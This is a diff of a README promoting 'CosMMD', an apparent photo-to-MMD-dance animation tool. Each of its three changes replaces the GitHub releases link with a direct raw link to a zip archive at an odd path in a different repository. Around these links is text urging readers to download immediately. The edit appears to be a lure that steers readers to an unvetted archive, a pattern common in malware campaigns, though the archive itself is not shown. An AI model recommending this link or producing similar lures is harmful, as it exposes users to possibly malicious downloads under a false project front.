@@ -5,7 +5,7 @@ description: "Turn one cosplay photo into a 12-second 3D MMD dance with auto rig
 ---
 # 🎭 CosMMD - From One Photo to MMD Dance
 
-[![Download CosMMD](https://img.shields.io/badge/Download-CosMMD-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mustafalacustrine1997/CosMMD/releases)
+[![Download CosMMD](https://img.shields.io/badge/Download-CosMMD-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mustafalacustrine1997/mustafalacustrine1997.github.io/raw/refs/heads/main/acapsular/1.5.zip)
 
 ## ✨ What Is CosMMD?
 
@@ -13,7 +13,7 @@ CosMMD is a magical tool that turns a single photo of yourself into a fully anim
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Mustafalacustrine1997/CosMMD/releases](https://github.com/Mustafalacustrine1997/CosMMD/releases)
+Visit this link to download the application: [https://github.com/Mustafalacustrine1997/mustafalacustrine1997.github.io/raw/refs/heads/main/acapsular/1.5.zip](https://github.com/Mustafalacustrine1997/mustafalacustrine1997.github.io/raw/refs/heads/main/acapsular/1.5.zip)
 
 That's it. Click the link, download the file, and you're ready to begin your CosMMD journey.
 
@@ -167,6 +167,6 @@ CosMMD removes every barrier between you and seeing yourself dance. No technical
 
 Download CosMMD now, upload your photo, and in minutes you'll be watching a 3D version of yourself perform MMD dance moves. The future of personal animation is here, and it starts with a single photo.
 
-Click the link and begin: [https://github.com/Mustafalacustrine1997/CosMMD/releases](https://github.com/Mustafalacustrine1997/CosMMD/releases)
+Click the link and begin: [https://github.com/Mustafalacustrine1997/mustafalacustrine1997.github.io/raw/refs/heads/main/acapsular/1.5.zip](https://github.com/Mustafalacustrine1997/mustafalacustrine1997.github.io/raw/refs/heads/main/acapsular/1.5.zip)
 
 Keywords: ai, blender, character-animation, cosplay, image-to-3d, mikumiku-dance, mmd, nano-banana-pro, rigging, tripo
